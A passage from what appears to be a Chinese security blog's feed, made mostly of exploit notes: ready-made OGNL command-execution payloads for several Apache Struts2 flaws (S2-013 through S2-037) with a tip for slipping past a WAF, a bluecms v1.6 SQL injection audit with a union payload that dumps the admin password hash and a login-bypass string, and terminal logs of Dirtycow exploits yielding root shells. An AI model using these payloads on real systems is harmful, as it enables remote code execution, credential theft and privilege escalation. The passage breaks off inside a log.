class="code"><pre><span class="line">%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%29%7D%0A%0A</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-013-S2-014"><a href="#Struts2-S2-013-S2-014" class="headerlink" title="Struts2 S2-013/S2-014"></a>Struts2 S2-013/S2-014</h2><pre><code>影响版本: 2.0.0 - 2.3.14.1漏洞详情: https://cwiki.apache.org/confluence/display/WW/S2-013,https://cwiki.apache.org/confluence/display/WW/S2-014</code></pre><p>标签<code>s:url</code>和<code>s:a</code>中提供include参数，其参数值可以为</p><ol><li>none - include no parameters in the URL (default)</li><li>get - include only GET parameters in the URL</li><li>all - include both GET and POST parameters in the URL</li></ol><p>如果参数值为get或all，在获取对应的参数值时执行了OGNL表达式</p><h3 id="构造PoC-4"><a href="#构造PoC-4" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根目录-3"><a href="#获取web根目录-3" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;webpath%3a&apos;%2b%23req.getRealPath(&quot;/&quot;)),%23out.close())&#125;</span><br></pre></td></tr></table></figure><h4 id="执行系统命令-3"><a href="#执行系统命令-3" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23a=@java.lang.Runtime@getRuntime().exec(&apos;&quot;+cmd+&quot;&apos;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;dbapp%3a&apos;%2bnew java.lang.String(%23d)),%23out.close())&#125;</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-016"><a href="#Struts2-S2-016" class="headerlink" title="Struts2 S2-016"></a>Struts2 S2-016</h2><pre><code>影响版本: 2.0.0 - 2.3.15漏洞详情: https://struts.apache.org/docs/s2-016.html</code></pre><p>​    </p><blockquote><p>DefaultActionMapper 类支持以 action:，redirect: 和 redirectAction: 作为访问前缀，前缀后面可以跟 OGNL 表达式，由于 Struts2 未对其进行过滤，导致任意 Action 可以使用这些前缀执行任意 OGNL 表达式，从而导致任意命令执行</p></blockquote><p>上文引用<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">rickgray</a>的描述。</p><h3 id="构造PoC-5"><a href="#构造PoC-5" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根目录-4"><a href="#获取web根目录-4" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:$&#123;#req=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletReq&apos;+&apos;uest&apos;),#resp=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletRes&apos;+&apos;ponse&apos;),#resp.setCharacterEncoding(&apos;UTF-8&apos;),#ot=#resp.getWriter (),#ot.print(&apos;web&apos;),#ot.print(&apos;path:&apos;),#ot.print(#req.getSession().getServletContext().getRealPath(&apos;/&apos;)),#ot.flush(),#ot.close()&#125;</span><br></pre></td></tr></table></figure><h4 id="执行系统命令-4"><a href="#执行系统命令-4" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;whoami&apos;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&apos;co&apos;+&apos;m.ope&apos;+&apos;nsymph&apos;+&apos;ony.x&apos;+&apos;wor&apos;+&apos;k2.disp&apos;+&apos;atch&apos;+&apos;er.HttpSe&apos;+&apos;rvletRe&apos;+&apos;sponse&apos;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;&apos;</span><br></pre></td></tr></table></figure><p>还有一种比较隐蔽的方法，将PoC放在文件上传的name处，过waf。</p><h2 id="Struts2-S2-019"><a href="#Struts2-S2-019" class="headerlink" title="Struts2 S2-019"></a>Struts2 S2-019</h2><pre><code>影响版本: 2.0.0 - 2.3.15.1漏洞详情: https://cwiki.apache.org/confluence/display/WW/S2-019</code></pre><p>该漏洞成因为开启了开发者模式，传入<code>debug=command&amp;expression=</code>导致执行OGNL表达式，从而造成命令执行漏洞。</p><h3 id="构造PoC-6"><a href="#构造PoC-6" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根路径-1"><a href="#获取web根路径-1" class="headerlink" title="获取web根路径"></a>获取web根路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=command&amp;expression=%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23resp.setCharacterEncoding%28%27UTF-8%27%29%2C%23resp.getWriter%28%29.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29</span><br></pre></td></tr></table></figure><h4 id="执行系统命令-5"><a href="#执行系统命令-5" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-032"><a href="#Struts2-S2-032" class="headerlink" title="Struts2 S2-032"></a>Struts2 S2-032</h2><pre><code>影响版本: 2.3.20 - 2.3.28 (except 2.3.20.3 and 2.3.24.3)漏洞详情: https://struts.apache.org/docs/s2-032.html</code></pre><blockquote><p>在配置了 Struts2 DMI 为 True 的情况下，可以使用 method:<name> Action 前缀去调用声明为 public 的函数，DMI 的相关使用方法可参考官方介绍（Dynamic Method Invocation），这个 DMI 的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会，代码详情可参考阿尔法实验室的报告 - 《Apache Struts2 s2-032技术分析及漏洞检测脚本》</name></p></blockquote><p>上文引用<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">rickgray</a>的描述。</p><h3 id="构造PoC-7"><a href="#构造PoC-7" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根目录-5"><a href="#获取web根目录-5" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath:</span><br></pre></td></tr></table></figure><h4 id="执行系统命令-6"><a href="#执行系统命令-6" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag:</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-037"><a href="#Struts2-S2-037" class="headerlink" title="Struts2 S2-037"></a>Struts2 S2-037</h2><pre><code>影响版本: 2.3.20 - 2.3.28.1漏洞详情: http://struts.apache.org/docs/s2-037.html</code></pre><blockquote><p>这个漏洞和之前S2-032/033是一个地方，都是在DefaultActionInvocation.java的invokeAction方法中没有对于methodName参数内容进行校验，便直接丢到了getValue方法里面，从而造成Ongl表达式的注入。</p></blockquote><p>上文引用<a href="http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438" target="_blank" rel="noopener">nsfocus</a>%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html)的描述</p><h3 id="构造PoC-8"><a href="#构造PoC-8" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根目录-6"><a href="#获取web根目录-6" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close):xx.toString.json?&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath:</span><br></pre></td></tr></table></figure><h4 id="执行系统命令-7"><a href="#执行系统命令-7" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()):xx.toString.json?&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag:</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Struts2命令执行算是一个比较经典的漏洞了，希望以后深入java的一些框架，可以从底层来分析：）</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bluecms v1.6 Sql Injection 分析</title>
      <link href="2017/01/11/old-old-bluecms-v1-6-Sql-Injection/"/>
      <url>2017/01/11/old-old-bluecms-v1-6-Sql-Injection/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>很久没有代码审计了，拿一套简单的找找感觉。bluecms是一套比较老的门户网站cms，网上也有很多关于它的漏洞还未修补，所以下文的漏洞也不算是最新的，仅当是练练手。</p><a id="more"></a><h1 id="SQL注入分析"><a href="#SQL注入分析" class="headerlink" title="SQL注入分析"></a>SQL注入分析</h1><p>首先关注一下数据的输入</p><h2 id="全局数据转义"><a href="#全局数据转义" class="headerlink" title="全局数据转义"></a>全局数据转义</h2><p>在common.inc.php中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$_POST = deep_addslashes($_POST);</span><br><span class="line">$_GET = deep_addslashes($_GET);</span><br><span class="line">$_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">$_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再跟进一下deep_addslashes</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function deep_addslashes($str)</span><br><span class="line">&#123;</span><br><span class="line">if(is_array($str))</span><br><span class="line">&#123;</span><br><span class="line">foreach($str as $key=&gt;$val)</span><br><span class="line">&#123;</span><br><span class="line">$str[$key] = deep_addslashes($val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$str = addslashes($str);</span><br><span class="line">&#125;</span><br><span class="line">return $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现对数据的注入，进行了加斜杠转义的操作。那么接下来找注入思路主要有以下3点：</p><ol><li>找整数型注入</li><li>整套cms默认gb2312编码，容易造成宽字节注入</li><li>http头并不在转义的范围内，所以类似存入ip，reffer的位置也能发生注入</li></ol><h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><p>拿grep匹配了一下$_GET，找到一处不做其他过滤的整数型位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ad_js.php:$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;</span><br></pre></td></tr></table></figure><p>跟进ad_js.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;</span><br><span class="line">if(empty($ad_id))</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;Error!&apos;;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&apos;ad&apos;).&quot; WHERE ad_id =&quot;.$ad_id);</span><br></pre></td></tr></table></figure><p>getone函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function getone($sql, $type=MYSQL_ASSOC)&#123;</span><br><span class="line">    $query = $this-&gt;query($sql,$this-&gt;linkid);</span><br><span class="line">    $row = mysql_fetch_array($query, $type);</span><br><span class="line">    return $row;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里对ad_id没有做其他过滤处理，造成了整数型注入,由于后面会将ad_content打印在页面上，所以直接用union注入就可以获得数据，构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,concat(admin_name,0x23,pwd)%20from%20blue_admin%20limit%201</span><br></pre></td></tr></table></figure><p>结果可以在返回的界面中看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">document.write(&quot;admin#21232f297a57a5a743894a0e4a801fc3&quot;);</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>ps:因为该cms错误回显具体sql语句，表前缀可以通过报错的方法把表前缀爆出来。</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>bluecms操作数据库的具体类定义在mysql.class.php,默认连接时的编码为gbk，我们可以知道当数据库连接时的编码为gbk等双字节编码时，容易发生宽字节注入。前面提到该套cms对数据输入进行了转义的操作，那么刚刚好条件都齐了，必然存在宽字节注入。grep看了一下，基本上的字符串都只是做了转义处理，所以字符串数据输入点都存在宽字节注入。大多数注入都是盲注，没找到具体可以会显数据的地方，这里就简单看一下登陆处</p><h3 id="后台登录处"><a href="#后台登录处" class="headerlink" title="后台登录处"></a>后台登录处</h3><p>其实前台user.php，也存在注入，只是盲注，这里就取简单的后台登录验证处<br>admin/login.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">elseif($act == &apos;do_login&apos;)&#123;</span><br><span class="line"> $admin_name = isset($_POST[&apos;admin_name&apos;]) ? trim($_POST[&apos;admin_name&apos;]) : &apos;&apos;;</span><br><span class="line"> $admin_pwd = isset($_POST[&apos;admin_pwd&apos;]) ? trim($_POST[&apos;admin_pwd&apos;]) : &apos;&apos;;</span><br><span class="line"> $remember = isset($_POST) ? intval($_POST[&apos;rememberme&apos;]) : 0;</span><br><span class="line"> if($admin_name == &apos;&apos;)&#123;</span><br><span class="line"> showmsg(&apos;xxx&apos;);</span><br><span class="line"> &#125;</span><br><span class="line"> if($admin_pwd == &apos;&apos;)&#123;</span><br><span class="line"> showmsg(&apos;xxx&apos;);</span><br><span class="line"> &#125;</span><br><span class="line"> if(check_admin($admin_name, $admin_pwd))&#123;</span><br><span class="line"> update_admin_info($admin_name);</span><br><span class="line"> if($remember == 1)&#123;</span><br><span class="line"> setcookie(&apos;Blue[admin_id]&apos;, $_SESSION[&apos;admin_id&apos;], time()+86400);</span><br><span class="line"> setcookie(&apos;Blue[admin_name]&apos;, $admin_name, time()+86400);</span><br><span class="line">setcookie(&apos;Blue[admin_pwd]&apos;, md5(md5($admin_pwd).$_CFG[&apos;cookie_hash&apos;]), time()+86400);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;else&#123;</span><br><span class="line"> showmsg(&apos;xxx&apos;);</span><br><span class="line"> &#125;</span><br><span class="line"> showmsg(&apos;xxx&apos;, &apos;index.php&apos;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>继续跟进check_admin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function check_admin($name, $pwd)</span><br><span class="line">&#123;</span><br><span class="line">global $db;</span><br><span class="line">$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$name&apos; and pwd = md5(&apos;$pwd&apos;)&quot;);</span><br><span class="line"> if($row[&apos;num&apos;] &gt; 0)</span><br><span class="line"> &#123;</span><br><span class="line"> return true;</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line"> return false;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里发生了一次登陆验证，可以通过宽字节注入来做万能密码登陆。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_name=admin%65%27+or+1%3D1%23&amp;pwd=123</span><br></pre></td></tr></table></figure><p><img src="../../../../img/bluecms_code_review/bluecms_login_success.png" alt></p><h2 id="存入ip造成注入"><a href="#存入ip造成注入" class="headerlink" title="存入ip造成注入"></a>存入ip造成注入</h2><p>在common.inc.php中可以找到getip()函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function getip()</span><br><span class="line">&#123;</span><br><span class="line">if (getenv(&apos;HTTP_CLIENT_IP&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_CLIENT_IP&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_X_FORWARDED_FOR&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_X_FORWARDED_FOR&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_X_FORWARDED&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_X_FORWARDED&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_FORWARDED_FOR&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_FORWARDED_FOR&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_FORWARDED&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_FORWARDED&apos;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">&#125;</span><br><span class="line">return $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看看调用他的位置<br><img src="../../../../img/bluecms_code_review/bluecms_getip.png" alt></p><p>online_ip调用处<br><img src="../../../../img/bluecms_code_review/bluecms_online_ip.png" alt></p><p>看看guest_book.php处存在insert注入，并且可以通过覆盖后面的content，造成数据回显。通过xff传入注入语句或者client ip传入。</p><p><img src="../../../../img/bluecms_code_review/bluecms_ip_injection.png" alt><br>结果可以看到<br><img src="../../../../img/bluecms_code_review/bluecms_ip_results.png" alt></p><p>其他位置的注入，不能回显，就不分析了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总体来说，直接可以grep到<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>的cms，审计起来会比较轻松。可以先从入口看起，将common,config等文件看一遍，再查找危险函数，数据入口就可审计出几个漏洞来。bluecms暂时审计到这一步，主要找的是SQL注入的漏洞。其他漏洞打算准备另外一套cms来审计:)</p>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2016-5195 Dirtycow</title>
      <link href="2016/10/26/old-old-dirtycow-cve-2016-5195/"/>
      <url>2016/10/26/old-old-dirtycow-cve-2016-5195/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>最近出来的dirtycow，影响版本:Linux kernel &gt;= 2.6.22（2007年发行，到今年10月18日才修复）,用网上的EXP试了一下，记录一下过程<br><a id="more"></a></p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><h3 id="https-www-exploit-db-com-exploits-40616"><a href="#https-www-exploit-db-com-exploits-40616" class="headerlink" title="https://www.exploit-db.com/exploits/40616/"></a><a href="https://www.exploit-db.com/exploits/40616/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40616/</a></h3><p>这个EXP是exploitdb上的，但是容易造成系统崩溃，成功后会返回一个root权限的shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">okami@ubuntu14:~$ ./dirtycow</span><br><span class="line">DirtyCow root privilege escalation</span><br><span class="line">Backing up /usr/bin/passwd.. to /tmp/bak</span><br><span class="line">Size of binary: 47032</span><br><span class="line">Racing, this may take a while..</span><br><span class="line">thread stopped</span><br><span class="line">thread stopped</span><br><span class="line">/usr/bin/passwd is overwritten</span><br><span class="line">Popping root shell.</span><br><span class="line">Don&apos;t forget to restore /tmp/bak</span><br><span class="line">root@ubuntu14:/home/okami# id</span><br><span class="line">uid=0(root) gid=1000(okami) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(okami)</span><br><span class="line">root@ubuntu14:/home/okami# whoami</span><br><span class="line">root</span><br><span class="line">root@ubuntu14:/home/okami#</span><br></pre></td></tr></table></figure><h3 id="https-github-com-scumjr-dirtycow-vdso"><a href="#https-github-com-scumjr-dirtycow-vdso" class="headerlink" title="https://github.com/scumjr/dirtycow-vdso"></a><a href="https://github.com/scumjr/dirtycow-vdso" target="_blank" rel="noopener">https://github.com/scumjr/dirtycow-vdso</a></h3><p>这个EXP不会出现系统崩溃，但是作者本人说不适用于所有linux版本，不过试验了一下，ubuntu14 16 centOS7都可以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">okami@ubuntu14:~$ ./0xdeadbeef</span><br><span class="line">[*] exploit: patch 1/2</span><br><span class="line">[*] vdso successfully backdoored</span><br><span class="line">[*] exploit: patch 2/2</span><br><span class="line">[*] vdso successfully backdoored</span><br><span class="line">[*] waiting for reverse connect shell...</span><br><span class="line">[*] enjoy!</span><br><span class="line">[*] restore: patch 2/2</span><br><span class="line">[*] vdso successfully restored</span><br><span class="line">[*] restore: patch 1/2</span><br><span class="line">[*] vdso successfully restored</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">lsb_release -a</span><br><span class="line">No LSB modules are 